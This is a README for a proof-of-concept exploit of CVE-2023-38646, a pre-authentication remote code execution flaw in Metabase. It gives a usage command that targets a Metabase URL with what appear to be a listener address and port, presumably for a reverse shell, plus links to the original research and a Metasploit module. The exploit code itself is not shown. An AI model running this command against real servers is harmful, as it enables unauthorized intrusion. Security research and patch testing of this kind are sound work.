# Metabase Pre-Auth Remote Code Execution CVE-2023-38646

A proof-of-concept for CVE-2023-38646 Metabase Pre-Auth Remote Code Execution

## Getting Started

### Executing program

* With python3
```
python3 exploit.py -t http://metabase.url/ -l 127.0.0.1 -p 1337
```

## Help

For help menu:
```
python3 exploit.py -h
```

## Acknowledgments

Backstory and Inspiration
* [Original Post](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)

Idea based on this PoC
* [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/metabase_setup_token_rce.rb)

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.